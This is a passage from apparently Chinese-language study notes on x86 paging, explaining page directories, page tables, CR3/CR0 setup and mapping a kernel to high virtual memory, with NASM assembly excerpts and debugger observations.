src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/bb0b37403a3132f2c94521f606306756-16683301558175.png" class=""><p>开始将所有段的<strong>P位</strong>清零，表示暂时不在内存中，把要访问的段<strong>P位置1</strong>，将其调入物理内存中</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/7926fbcef13874a2671f401b9a37b35f-16683301558176.png" class=""><p>将段1置换到外部磁盘、将段1的<strong>P位</strong>清零、将段3置换到物理内存、将段3的<strong>P位</strong>置1</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/584e40306c3dc5a8a811fe0e018ba3d2-16683301558178.png" class=""><p>下次访问段1，发现<strong>P = 0</strong>，首先将其置换到物理内存中、再将段3的<strong>P位</strong>清零、再将段1的<strong>P位</strong>置1.使用上述这种方式实现<strong>段式虚拟内存管理策略</strong>。</p><p>实际中，段有大有小当内存空间不足时需要进行段的换入换出，置换出当前使用最少的段。在描述符中有一个特殊的<strong>位A</strong>，表示以访问位。当处理器访问一个段时，自动将<strong>A</strong>置1，根据<strong>A位</strong>被改变的频次可以知道哪些段是是用最少的，就能对其进行置换。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/34904d9c5835832a2e72d6ea283c84ff-16683301558177.png" class=""><p>如上图，由于段的长度不同，在进行段的换入换出之后，虽然内存中剩余容量足够，但是内存不连续，也导致不能被使用。就如<strong>段5</strong>无法被调入内存。<strong>x86</strong>使用了内存分页技术解决这个问题，将物理内存分为大小相同的页，并将长度不同的段映射近长度相同的页。</p><h2 id="02-每个任务独立的虚拟内存"><a href="#02-每个任务独立的虚拟内存" class="headerlink" title="02. 每个任务独立的虚拟内存"></a>02. 每个任务独立的虚拟内存</h2><p>每个任务都分配一个4GB的虚拟内存空间低一半<mark>0x00000000 ~ 0x7FFFFFFF</mark>为私有部分，高一半<mark>0x80000000 ~ 0xFFFFFFFF</mark>为全局部分。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/d47a393d2fdb43c0a19a9c42d2c3e708-16683301558179.png" class=""><p>在多任务系统中，任务的全局部分共有，私有部分独立：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/c75045c9e153d106f0ee9c46e78b4d21-166833015581710.png" class=""><p>重新规划任务的内存空间：全局部分和私有部分各有2GB，如下，若私有部分有5个段，分别映射到2GB字节虚拟内存中。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/6bbc331d521c2b23008955260caf01da-166833015581712.png" class=""><h2 id="03-物理内存的分页以及段到页的拆分"><a href="#03-物理内存的分页以及段到页的拆分" class="headerlink" title="03. 物理内存的分页以及段到页的拆分"></a>03. 物理内存的分页以及段到页的拆分</h2><p>任务对应为一些文件，最主要的可执行文件包含代码段、数据段、栈段以及段的实际内容，其他文件可以是工作文档、图像、视频文件等等，可以被加载到数据段中进行处理。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/93616ac55c672e94aecb012e18395328-166833015581713.png" class=""><p>内核有自己的可执行文件和其它文件，是所有任务共享的，每个任务都有自己的可执行文件和其他文件。</p><p>当任务执行时，要把可执行文件都映射到自己的虚拟内存，映射就是计算每个段在虚拟内存中的起始位置和长度，然后创建和安装其描述符。</p><p>映射之后，下一步工作是将段进行切分，然后加载到物理内存。物理内存是4G字节，每一部分都是一个页，页的最小长度是4KB。之后就是将虚拟内存中的段进行4K字节的拆分映射到物理内存中</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/36a2e0300007314f584d45006d3de7ad-166833015581711.png" class=""><p>如上图，在虚拟内存中的12606字节的段被划分到占3个4096字节完整的页 + 1个占318字节的页中。即使不足4KB也要按照4KB进行映射</p><p>段是连续的，页不需要是连续的。在内存中闲置的页和被占用的页是随机交错存在的，无法保证哪些页被释放哪些页被占用。也就无法保证分配的页在什么位置</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/5287f633388a52beac4c4258391c5a66-166833015581715.png" class=""><p>对内存的分页是逻辑上的、而不是物理上的。同时页的起始位置也有要求，对于4KB的页来说，起始位置必须是4096字节（即0x1000)的整倍数。</p><p>课后练习题：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/885d06e0f92aa2df15899b4f9094e35a-166833015581714.png" class=""><h2 id="04-处理器的段部件和页部件"><a href="#04-处理器的段部件和页部件" class="headerlink" title="04. 处理器的段部件和页部件"></a>04. 处理器的段部件和页部件</h2><p>分页（paing：名词，表示以页为基础的内存管理模式），开启分页机制后，在程序执行前，要把可执行文件中的段映射到虚拟内存，然后再把段中的内容加载到物理内存中的页。</p><p>为什么要引入虚拟内存、要把程序映射到虚拟内存呢？<br>Intel处理器是按照分段机制工作的，只不过在分页模式下，段是安排在虚拟内存的。将程序映射到虚拟内存就是规划所有段在虚拟内存中的布局和位置。并根据这些信息来创建段描述符</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/340687599ee7c41b66cadb4e85366328-166833015581717.png" class=""><p>如上图，处理器只是规划可执行文件在虚拟内存中的布局，并不会把代码加载进虚拟内存中。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/ccb29b4b220f40bfa03a583e0251bfd4-166833015581716.png" class=""><p>在没有开启分页机制时，段部件输出的地址就是物理地址</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/93b5bdef561fe3821708a0f77fa511f9-166833015581718.png" class=""><p>开启分页机制后，段部件输出的地址就是线性地址，线性地址是虚拟内存中的地址，要传送给页部件，页部件用来将线性地址转换为物理地址</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/b1f267f0104a6773190214d35953bd65-166833015581719.png" class=""><p><strong>页部件</strong>将<strong>段部件</strong>传送来的<strong>线性地址</strong>转换为<strong>物理地址</strong>。<strong>页部件</strong>将<strong>线性地址</strong>拆分成<strong>页地址</strong>和<strong>页内偏移</strong>，再将<strong>页地址</strong>修改为<strong>真实的物理页地址</strong>即可。如线性地址<strong>0x00201000</strong>，页部件将页地址转换为<strong>0x00004000</strong>、偏移为<strong>0xCC</strong>，则转换后的地址就是<strong>0x000040CC</strong>。</p><h2 id="05-从线性地址到物理地址的转换过程"><a href="#05-从线性地址到物理地址的转换过程" class="headerlink" title="05. 从线性地址到物理地址的转换过程"></a>05. 从线性地址到物理地址的转换过程</h2><p>线性地址到物理地址的转换：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/0b3f8e4539156e697b30c8330722dcef-166833015581721.png" class=""><p><strong>线性地址的前20位</strong>对应<strong>物理地址的前20位</strong>。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/079466d3ffa8514574fe5a7827cc4ff0-166833015581722.png" class=""><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/b771000981bd8fddea1731849f08ee2a-166833015581720.png" class=""><p>每个表项占4个字节，所以访问表项时，使用虚拟页地址的<strong>高20位</strong>乘以4</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/4defd07ca51dd0f680870b47b4bd5557-166833015581724.png" class=""><ul><li>段描述符的基地址 + 指令中的偏移量传送给段部件</li><li>段部件输出线性地址<strong>0x0020010C8</strong></li><li>线性地址的<strong>高20</strong>位<strong>乘以4</strong>去访问表项取出物理页地址的<strong>高20位</strong></li><li>线性地址的<strong>低12位</strong>和上一步取出物理页地址的<strong>高20位</strong>结合形成物理地址</li><li>使用这个物理地址访问内存<img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/6c560a13f33c3a4ab7c0e856e07fce62-166833015581723.png" class="">各个任务都有自己独立的4GB虚拟内存空间和独立的页映射表。</li></ul><p>课后作业：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/a89f73cb347d517ecd51ad35d5df478d-166833015581725.png" class=""><h2 id="06-页目录和页表及其地址转换过程"><a href="#06-页目录和页表及其地址转换过程" class="headerlink" title="06. 页目录和页表及其地址转换过程"></a>06. 页目录和页表及其地址转换过程</h2><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/beb5acd012b007f792699b63338eff0f-166833015581727.png" class=""><p>页映射表需要<strong>4MB</strong>大小</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/763bc09ba5fc0f5dd61cd15b5c4af155-166833015581726.png" class=""><p>页映射表必须一开始就完全定义，而且会占用<strong>4MB</strong>内存空间。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/fcf277bc282630c1024cc9525453f59f-166833015581829.png" class=""><p>层次化的分页结构，即不采用单一的<strong>页映射表</strong>，使用<strong>页目录表</strong>和<strong>页表</strong>替代。<br><strong>页表</strong>中每个<strong>页表项</strong>占据4个字节（32位）用来存放<strong>物理页地址</strong>，共可保存1024个<strong>物理页地址</strong>，即每个<strong>页表</strong>大小为4KB。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/c7312b043bc27fce971c77a8debceca8-166833015581831.png" class=""><p><strong>CR3</strong>存放当前任务<strong>页目录</strong>的物理地址，也叫做<strong>页目录基址寄存器</strong></p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/92e225986b4e3925e3d7e7642af46952-166833015581828.png" class=""><p>没有开启分页机制时，段部件发出的地址就是物理地址<strong>0x00801050</strong><br>开启分页机制：</p><ul><li>段部件发出线性地址，处理器将其分为三部分（高10位、中间10位、低12位）</li><li>处理器从当前任务状态段<strong>TSS</strong>中取出<strong>CR3</strong>寄存器的值，里面存放的是当前任务所用的页目录物理基地址</li><li>接着将线性地址高10位乘以4得到页目录中的偏移，从页目录的这个地址中取出页表的物理基地址</li><li>接着将线性地址的中间10位乘以4得到其在页表中的偏移，从页表的这个地址中取出线性地址对应的物理基地址</li><li>接着使用这个基地址<strong>加上</strong>线性地址的低12位形成物理地址，这样就把段部件发出的线性地址转换为<strong>物理地址了</strong></li></ul><p><strong>其中乘以4时因为页目录和页表中每一项都是占据4个字节的，所以需要乘以4才能得到每一项在表中对应的偏移</strong>。</p><p>这种变化是事先安排好的，当程序加载时操作系统先创建虚拟的段，根据段地址的高20位来判断需要用到哪些页目录项和页表项，之后在物理内存中寻找空闲的页，并将页的物理地址填写到对应的页表项中，之后程序就可以按照这些值把线性地址转换为物理地址。</p><h2 id="07-设计内核的页目录和页表"><a href="#07-设计内核的页目录和页表" class="headerlink" title="07. 设计内核的页目录和页表"></a>07. 设计内核的页目录和页表</h2><p>本章程序：<br>引导程序：<strong>c13_mbr0.asm</strong><br>内核程序：<strong>c31_core0.asm</strong><br>用户程序1：<strong>c30_app0.asm</strong><br>用户程序2：<strong>c30_app1.asm</strong></p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/419baf206d393622a45a6df21ff7a1db-166833015581830.png" class=""><p>系统中的执行顺序为：</p><ul><li>先创建页目录和页表、在虚拟内存中规划每个段的位置并创建段描述符</li><li>处理器的页部件从段部件输出的线性地址中提取前20位作为索引来访问页目录表和页表，看对应的物理页是否存在</li><li>如果页不存在，则在物理内存中搜索这个物理页，并将页的物理地址填写在页表中，这样就可以访问这个物理页</li><li>如果页存在，则直接访问这个页找到对应的物理地址以此访问这个页</li></ul><p>内核程序中，显示处理器品牌信息之后开始准备打开分页机制。但是此时内核是都开启页功能之前加载的，其内容在内存中的位置已经固定。此时要想当前执行流程在开启分页之后还能继续进行，就必须让段部件发出的线性地址等于页部件发出的物理地址</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/f045a9fa5ce5ccbb02648df2229d15a8-166833015581832.png" class=""><p>我们内核处于低端1MB，对低端1MB的内存特殊处理，让这部分的线性地址等于页部件转换之后的物理地址即可。那么这样做之后内核就不需要做任何变动就可以在分页机制下正常工作</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/234c965b022ff7b6681224e3a0062c63-166833015581833.png" class=""><p>一个页表可以管理4MB内存，那么对于这个内核只需要一个页表即可。页目录和页表放在任何有效的物理内存地址都可，如上，放在<strong>0x00020000</strong>处。</p><h2 id="08-页目录项和页表项的组成格式"><a href="#08-页目录项和页表项的组成格式" class="headerlink" title="08. 页目录项和页表项的组成格式"></a>08. 页目录项和页表项的组成格式</h2><p>目的对于低端<strong>1MB</strong>内存，<strong>段部件发出的线性地址</strong>和<strong>页部件发出的物理地址</strong>相同。</p><p>创建页目录，将其清零：</p><pre><code class="assembly">    ;创建系统内核的页目录表PDT    mov ecx,1024                       ;1024个目录项    mov ebx,0x00020000                  ;页目录的物理地址    xor esi,esi;页目录表清零.b1:    mov dword [es:ebx+esi],0x00000000  ;页目录表项清零    add esi,4    loop .b1</code></pre><p>页目录项、页表项的组成格式：在页目录中只保存了<mark>页<strong>表</strong>物理地址的高20位</mark>、在页表中只保存了<mark>页物理地址的高20位</mark>。因为页表和页目录要求是4K字节对齐，所以低12位为0</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/014976f410021c0c1e7c7413cd1827fb-166833015581836.png" class=""><ul><li><strong>P位（Present）</strong>：1表示页表或页目录存在于内存中、0表示不在内存中，需要创建或从磁盘调入</li><li><strong>R/W位（Read/Write）</strong>：0页目录或页表只读、1表示可读可写</li><li><strong>US位（User/Supervisor）</strong>：1时表示所有特权级别的程序访问，0表示只有特权级0、1、2特权级的程序可以访问</li><li><strong>PWT位（Page Level Write-Through）</strong>：页级通写位，和高速缓存有关、通写是高速缓存的一种方式，0表示不允许使用此种方式提升页面访问效率、1表示允许</li><li><strong>PCD位（Page-Level Cache Disable）</strong>：高速缓存禁止位，0表示不使用高速缓存策略、1表示使用</li><li><strong>A位（Accessed）</strong>：由处理器固件设置，0表示此页未被访问过，1表示被访问过，操作系统定期将此位清零，通过此位被置1的次数了解此页的使用频率</li><li><strong>D位（Dirty）</strong>：由处理器固件设置，用来指示此表项的页已经写过数据。</li><li><strong>PAT位（Page-Attribute Table）</strong>：页属性表支持位，只对页表项起作用，页目录项中此位置0，和页高速缓存有关</li><li><strong>G位（Global）</strong>：指示该表项所指示的页是否为全局性质的，若页是全局的，他将会在高速缓存中一直保存，意味着地址转换的速度会很快</li><li><strong>AVL位（Available）</strong>：被处理器忽略，程序可以使用</li></ul><h2 id="09-创建内核的页表并初始化低端1MB对应的页表项"><a href="#09-创建内核的页表并初始化低端1MB对应的页表项" class="headerlink" title="09. 创建内核的页表并初始化低端1MB对应的页表项"></a>09. 创建内核的页表并初始化低端1MB对应的页表项</h2><p>在页目录内创建指向页目录自己的目录项：</p><pre><code class="assembly">    ;将页目录表的物理地址登记在它自己的最后一个页目录项内    ;页目录也可以容纳1024个，从0到3FF，最后一项的偏移为3FF X 4 = 0xFFC = 4092    mov dword [es:ebx+4092],0x00020003</code></pre><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/e3c365f0007bf5d9b3833567346b3f4c-166833015581834.png" class=""><p>程序前1MB占据一个页目录项和页表的前256个表项。修改页目录项的内容使其指向页表，填写的内容是页表的物理地址：<strong>0x00021000</strong>，该页位于内中，可读可写，但是不允许特权级别为3的程序访问，所以最终要填写<strong>0x00021003</strong>。</p><p>修改页目录中第一个表项的内容，使其指向页表：</p><pre><code class="assembly">    ;在页目录内创建与线性地址0x00000000对应的目录项    mov dword [es:ebx+0],0x00021003    ;写入目录项（页表的物理地址和属性）</code></pre><p>将低端1MB字节所包含的哪些页的物理地址按顺序填写到页表中：</p><pre><code class="assembly">    ;创建与上面那个目录项相对应的页表，初始化页表项    mov ebx,0x00021000                 ;页表的物理地址    xor eax,eax                        ;起始页的物理地址    xor esi,esi.b2:    mov edx,eax    or edx,0x00000003    mov [es:ebx+esi*4],edx             ;登记页的物理地址    add eax,0x1000                     ;下一个相邻页的物理地址    inc esi    cmp esi,256                        ;仅低端1MB内存对应的页才是有效的    jl .b2.b3:                                   ;其余的页表项置为无效    mov dword [es:ebx+esi*4],0x00000000    inc esi    cmp esi,1024    jl .b3</code></pre><p>开启分页功能之后，页表和物理地址的映射关系：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/1cdef7a86047f1863b9f3ce7742d262d-166833015581835.png" class=""><h2 id="10-设置控制寄存器CR3和CR0开启分页功能"><a href="#10-设置控制寄存器CR3和CR0开启分页功能" class="headerlink" title="10. 设置控制寄存器CR3和CR0开启分页功能"></a>10. 设置控制寄存器CR3和CR0开启分页功能</h2><p>开启分页：</p><pre><code class="assembly">    ;令CR3寄存器指向页目录，并正式开启页功能    mov eax,0x00020000  ;PCD=PWT=0    mov cr3,eax        cli;开启分页之前需要重新设置内核，不能发生中断，先关闭        mov eax,cr0    or eax,0x80000000    mov cr0,eax;开启分页机制                        ;从这条指令开始，段部件产生的就是线性地址不是物理地址</code></pre><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/54d5c6a1dbf186708bbbdb66410eee24-166833015581837.png" class=""><p>对控制寄存器使用MOV指令，和普通的MOV 指令不同，操作码不同</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/b1c16fc5f1bca227f50ff84a7bd875e7-166833015581839.png" class=""><p><strong>CR0</strong>寄存器的<strong>位31</strong>，<strong>PG</strong>位，0表示关闭分页、1表示开启分页。<strong>CR0</strong>的<strong>位0</strong>，<strong>PE</strong>位，0表示位于实模式、1表示位于保护模式。分页只能在保护模式下开启</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/6ccae13d834791c7061285a74c59a792-166833015581838.png" class=""><h2 id="11-在调试器中观察页目录表和页表"><a href="#11-在调试器中观察页目录表和页表" class="headerlink" title="11. 在调试器中观察页目录表和页表"></a>11. 在调试器中观察页目录表和页表</h2><p>写入程序：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/aecb11d2fe5887c73f36b8b825ac5b1b-166833015581840.png" class=""><p>分页之前：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/6c70462626d0d82f01f81c56083debb5-166833015581842.png" class=""><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/9b4f60cf5f2e43889d5600832c6904b4-166833015581841.png" class=""><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/d098a012924babbbd497fd1eccabb229-166833015581843.png" class=""><p>使用<strong>info tab</strong>命令查看可知，此时分页是关闭的。其中<strong>CR0</strong>的<strong>PG位</strong>是小写，为0。<strong>PE位</strong>大写为1，处于保护模式。</p><p>开启分页：</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/67b42d52f153a06592223adf2b7f4d47-166833015581845.png" class=""><p><strong>GDT</strong>内第二个描述符的线性地址为<strong>0x00007E08</strong></p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/0c417599ea065eef914819e2e1793415-166833015581844.png" class=""><h2 id="12-准备将内核映射到虚拟内存的高端"><a href="#12-准备将内核映射到虚拟内存的高端" class="headerlink" title="12. 准备将内核映射到虚拟内存的高端"></a>12. 准备将内核映射到虚拟内存的高端</h2><p>页目录的<strong>高2G字节</strong>指向内核的页表、<strong>低2G字节</strong>指向任务的页表。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/acf80d1de43efe9f041004f4a3b904b0-166833015581846.png" class=""><p>若页目录的<strong>高2GB</strong>不是指向内核的页表时，当从任务的私有部分转到内核执行时，段部件发出的地址一定是高于<strong>0x80000000</strong>的，此时就找不到内核所在的物理地址，无法完成地址转换。因此需要将内核映射到虚拟地址的高端</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/3ad1df59914bba12be726e1ae66c5926-166833015581847.png" class=""><p>内核映射到虚拟地址高端之后的内存布局。内核是位于虚拟内存，现在只是让段部件发出的地址位于虚拟地址的高端。</p><h2 id="13-在分页机制下访问页目录表自身"><a href="#13-在分页机制下访问页目录表自身" class="headerlink" title="13. 在分页机制下访问页目录表自身"></a>13. 在分页机制下访问页目录表自身</h2><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/9fc5d96dbc0a1504600ba8e77bb2b9b7-166833015581848.png" class=""><p>上图，现在需要在页目录中添加一个表项，使其指向内核原先的位置</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/b6c561c38b70ea1b53dae22737bdfce1-166833015581849.png" class=""><ul><li>页部件从<strong>CR3</strong>寄存器取出页部件的物理基地址，定位到页目录表</li><li>段部件发出的地址是<strong>0xFFFFF800</strong></li><li>取出<strong>高10位</strong>乘以4，作为页目录表内偏移，从页目录表中取出页表的物理地址，此时发现通过页目录表找到的页表仍然是页目录表自身的基址，即把页目录表当成页表使用</li><li>接着从线性地址<strong>中间10位</strong>取出页表内的偏移，取出页的物理基地址</li><li>再加上线性地址的<strong>低12位</strong>构成物理地址，去访问内存</li><li>将其设置为原先的值，这就将内核从虚拟内存的低端映射到了高端</li></ul><p>代码如下：</p><pre><code class="assembly">    ;在页目录内创建与线性地址0x80000000对应的目录项    ;mov ebx,0xfffff000                 ;页目录自己的线性地址    ;mov esi,0x80000000                 ;映射的起始地址    ;shr esi,22                         ;线性地址的高10位是目录索引    ;shl esi,2    ;mov dword [es:ebx+esi],0x00021003  ;写入目录项（页表的物理地址和属性）                             ;目标单元的线性地址为0xFFFFF200    mov dword [es:0xfffff800], 0x00021003</code></pre><h2 id="14-使内核在虚拟内存高端的映射生效"><a href="#14-使内核在虚拟内存高端的映射生效" class="headerlink" title="14. 使内核在虚拟内存高端的映射生效"></a>14. 使内核在虚拟内存高端的映射生效</h2><p>修改与内核有关的段描述符，以及<strong>GDT</strong>自己的线性地址</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/91a65c1fdf8d13e23c1bd7ec0059820a-166833015581850.png" class=""><p>只需要修改内核所有段描述符的最高位，将其<strong>置1</strong>即可（等于加上0x80000000)，代码如下：</p><pre><code class="assembly">    ;将GDT中的段描述符映射到线性地址0x80000000    sgdt [pgdt]        mov ebx,[pgdt+2]        or dword [es:ebx+0x10+4],0x80000000;处理保护模式下初始代码段描述符    or dword [es:ebx+0x18+4],0x80000000;处理内核的栈段描述符    or dword [es:ebx+0x20+4],0x80000000;处理显示缓冲区描述符    or dword [es:ebx+0x28+4],0x80000000;处理公共例程段描述符    or dword [es:ebx+0x30+4],0x80000000;处理内核数据段描述符    or dword [es:ebx+0x38+4],0x80000000;处理内核代码段描述符        add dword [pgdt+2],0x80000000      ;GDTR也用的是线性地址        lgdt [pgdt];使得修改生效</code></pre><p>修改中断描述符表<strong>IDTR</strong>，因为中断描述符表已经被映射到虚拟内存的高端</p><pre><code class="assembly">    ;修改IDTR，将中断描述符表映射到线性地址高端    sidt [pidt]    add dword [pidt+2],0x80000000      ;IDTR也用的是线性地址    lidt [pidt]</code></pre><p>段寄存器由段选择器和描述符高速缓存器组成，处理器执行指令时，不会每次都加载段选择器，而是使用段描述符高速缓存器中的基地址访问内存。</p><p>所以当修改了<strong>GDT</strong>的基地址或段描述符之后，这些修改不会立即反映到段描述符高速缓存器，对程序的运行没有任何影响。</p><p>但是当执行一个段间转移指令、或向段寄存器里加载一个新的段描述符选择子时，处理器会访问<strong>GDT</strong>或<strong>LDT</strong>，将刷新段寄存器的描述神高速缓存器中的内容</p><p>因此为了使处理器转移到内存高端执行，需要显示的刷新段寄存器内容，代码段<strong>CS</strong>的刷新需要用转移指令完成：</p><pre><code class="assembly">    jmp core_code_seg_sel:flush        ;刷新段寄存器CS，启用高端线性地址    ;导致处理器使用新的段选择子core_code_seg_sel来访问GDT；    ;从中取出修改后的代码段描述符，并加载到CS描述符高速缓存器中；    ;这直接导致处理器从虚拟地址高端取指令执行    flush:    mov eax,core_stack_seg_sel;刷新SS，同时刷新其描述符高速缓存器    mov ss,eax;物理地址没有改变，改变的是线性地址        mov eax,core_data_seg_sel;刷新DS，同时刷新其描述符高速缓存器    mov ds,eax;物理地址没有改变，改变的是线性地址</code></pre><p>即使是在分页机制下，显存的基地址部分加上了<strong>0x80000000</strong>，例程<strong>put_string</strong>和<strong>put_char</strong>也没有做任何修改。</p><p>尽管显存基地址已经映射到<strong>0x800B8000</strong>，但是向这个虚拟的地址写数据时，页部件将会把它转换为真实的显存位置<strong>0x000B8000</strong>.</p><h2 id="15-为内核任务创建任务控制块TCB"><a href="#15-为内核任务创建任务控制块TCB" class="headerlink" title="15. 为内核任务创建任务控制块TCB"></a>15. 为内核任务创建任务控制块TCB</h2><p>接上一节，为系统服务例程安装门描述符，没有修改，因为门描述符的创建只涉及目标代码段的选择以及例程在段内的偏移量，不受内存映射的影响。</p><img src="/2022/12/11/31-%E5%88%86%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%88%86%E9%85%8D/08ee83725bed57df523f887bad4feb86-166833015581851.png" 